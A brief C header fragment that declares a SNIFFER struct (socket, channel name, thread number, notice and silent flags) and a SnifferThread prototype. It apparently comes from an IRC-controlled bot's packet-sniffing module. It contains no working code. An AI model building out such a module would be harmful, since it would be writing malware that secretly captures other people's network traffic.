#ifndef NO_SNIFFER
typedef struct SNIFFER
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SNIFFER;

DWORD WINAPI SnifferThread(LPVOID param);
#endif